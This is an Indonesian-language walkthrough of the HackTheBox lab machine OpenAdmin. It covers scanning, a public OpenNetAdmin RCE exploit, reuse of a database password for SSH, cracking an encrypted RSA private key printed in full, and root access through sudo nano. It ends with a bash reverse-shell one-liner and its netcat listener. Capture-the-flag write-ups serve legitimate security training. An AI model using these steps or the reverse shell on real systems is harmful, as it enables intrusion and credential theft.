---
title: "HackTheBox Machine - OpenAdmin"
classes: wide
header:
  teaser: /assets/images/htb-frame.png
search: false
categories: 
  - HackTheBox Machine
toc: true
toc_label: "Contents"
last_modified_at: 2020-03-05T15:58:26+08:00
---

![HTB OpenAdmin](/assets/images/htb-machine-openadmin/featured-image.jpg)

### Scanning

Hal pertama yang dilakukan adalah scanning menggunakan nmap terhadap alamat ip `10.10.10.171`

![02](/assets/images/htb-machine-openadmin/02.png)

### Enumeration

didapatkan open port antara lain port `22` dan port `80`. Untuk port `80` yaitu akses website dapat dicek menggunakan browser.

![03](/assets/images/htb-machine-openadmin/03.png)

Namun, hanya tampilan `default` dari Apache2 server. Untuk itu dibutuhkan process enumerasi lebih lanjut terhadap akses alamat ip target tersebut, dengan menggunakan directory scanner, dalam hal ini saya gunakan `dirbuster` bawaan dari kali linux, dan dengan wordlist `directory-list-2.3-medium.txt`

![04](/assets/images/htb-machine-openadmin/04.png)

saat proses `brute-forcing` terdapat beberapa direktori yang dapat di tangkap, seperti direktori `music` dan `ona`, kemudian dilakukan pengecekan satu-persatu. Dan yang paling menarik adalah pada direktori `ona` tersebut, yang dapat diakses melalui url `http://10.10.10.171/ona` dan ini merupakan sebuah `clue` yang sesuai dengan nama machine htb tersebut yaitu `OpenAdmin`.

![05](/assets/images/htb-machine-openadmin/05.png)

Tidak perlu berlama lagi, proses bruteforcing tidak perlu dilanjutkan,dan langusung berfokus pada target `http://10.10.10.171/ona` yaitu sebuah website untuk monitoring sistem bernama `OpenNetAdmin`.

Selanjutnya beberapa hal yang perlu dilakukan antara lain adalah mencari informasi mengenai `OpenNetAdmin`, bisa menggunakan `searchploit` ataupun browsing/googling dengan kata kunci `OpenNetAdmin exploit`

Berikut tampilan dari `searchploit`
![06](/assets/images/htb-machine-openadmin/06.png)

Berikut tampilan dari website exploit-db [https://www.exploit-db.com/exploits/47691](https://www.exploit-db.com/exploits/47691)
![06-b](/assets/images/htb-machine-openadmin/06-b.png)

vuln yang digunakan adalah `OpenNetAdmin 18.1.1 - Remote Code Execution ` kemudian lanjut dengan meng-copy script dari path `exploits/php/webapps/47691.sh`

![07](/assets/images/htb-machine-openadmin/07.png)

`catatan`: gunakan command `dos2unix` pada file tersebut, agar kompatibel dengan sistem operasi linux/unix

![08](/assets/images/htb-machine-openadmin/08.png)

Jalankan script tersebut dengan target `http://10.10.10.171/ona`, kemudian didapatkan akses terminal terhadap server opennetadmin tersebut, dan diarahkan ke akses `www-data`
![09](/assets/images/htb-machine-openadmin/09.png)
![10](/assets/images/htb-machine-openadmin/10.png)

target enumerasi selanjutnya adalah file konfigurasi OpenNetAdmin tersebut yaitu pada direktori `/opt/ona/www/config/`

![11](/assets/images/htb-machine-openadmin/11.png)

terdapat informasi penting mengenai file konfigurasi database `OpenNetAdmin` tersebut yaitu pada `/opt/ona/www/config/database_setting.inc.php`

![12](/assets/images/htb-machine-openadmin/12.png)

informasi yang didapatkan adalah berupa `db_login`,`db_passwd`
![13](/assets/images/htb-machine-openadmin/13.png)

```php
'db_type' => 'mysqli',
'db_host' => 'localhost',
'db_login' => 'ona_sys',
'db_passwd' => 'n1nj4W4rri0R!',
'db_database' => 'ona_default',
'db_debug' => false,
$ 
```

Selanjutnya, menampilkan list user server `OpenNetAdmin` tersebut, yaitu `root`, `jimmy`, `joanna`

![14](/assets/images/htb-machine-openadmin/14.png)

Gunakan password yang didapatkan pada file `/opt/ona/www/config/database_setting.inc.php` yaitu `n1nj4W4rri0R!` untuk remote ssh, dalam hal ini merupakan password untuk user `jimmy`.


![15](/assets/images/htb-machine-openadmin/15.png)

### Privilege Escalation - USER (Joanna)

Untuk tahap selanjutnya, masuk ke direktori `/var/www/` dimana terdapat path lain yaitu `html` `internal` dan `ona` dalam hal ini path/direktori `internal` memberikan informasi penting yaitu mengenai file `main.php` yang mana terdapat informasi mengenai eksekusi `shell_exec` ke file `id_rsa` punya joanna

![16](/assets/images/htb-machine-openadmin/16.png)

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Kemudian saya mencoba untuk mengakses file `main.php` tersebut secara local menggunakan `curl` dan didapatkan informasi seperti gambar berikut, yang artinya menampilkan `404 Not Found`


![17](/assets/images/htb-machine-openadmin/17.png)

beberapa hal yang memungkinkan adalah terdapat service jaringan yang berjalan pada background, hal tersebut dapat di cek dengan menggunakan `netstat` dan terdapat informasi yang berjalan secara localhost adalah pada port database `127.0.0.1:3306` dan service `127.0.0.1:52846`

![17-b](/assets/images/htb-machine-openadmin/17-b.png)


Okay, mari kita akses dengan cmd `curl http://localhost:52846/main.php`, maka menampilkan `cat` terdapat file `/home/joanna/.ssh/id_rsa` untuk `joanna`.


![17-c](/assets/images/htb-machine-openadmin/17-c.png)

copy informasi certificate id_rsa tersebut, kemudian simpan untuk dilakukan bruteforce menggunakan john

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----

```

gunakan tool `ssl2john.py` dan `john` untuk melakukan bruteforce dan didapatkan password untuk joanna adalah `bloodninjas` -> `joanna:bloodninjas`

![18](/assets/images/htb-machine-openadmin/18.png)

selanjutnya mari lakukan akses ssh untuk akun joanna tersebut, kemudian akses flag `user.txt` 
![19](/assets/images/htb-machine-openadmin/19.png)

![19-b](/assets/images/htb-machine-openadmin/19-b.png)

### Privilege Escalation - ROOT

Disini saya mengunakan trik untuk membypass untuk melihat root.txt setelah mendapatkan akses untuk user `joanna`, gunakan command `sudo -l` untuk masuk ke akses `root`,di dapatkan informasi yaitu `/bin/nano /opt/priv`

![20](/assets/images/htb-machine-openadmin/20.png)

```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
joanna@openadmin:~$ 

```
berikut adalah trik untuk langsung mendapatkan flag `root.txt` eksekusi command `sudo nano /opt/priv`
![21](/assets/images/htb-machine-openadmin/21.png)

kemudian akan diarahkan ke `nano` dan tekan `ctrl+r` untuk `read file`, untuk step ini saya langsung ke path `/root/root.txt` :D kemudian tekan `Enter` dan ternyata dapat di akses

![22](/assets/images/htb-machine-openadmin/22.png)

**Tambahan:** untuk previllege escalation root, pada `sudo nano /opt/priv` input cli reverse shell menggunakan bash cli `bash -i >& /dev/tcp/10.10.14.21/4444 0>&1` kemudian dari sisi komputer host `nc -lvnp 4444`






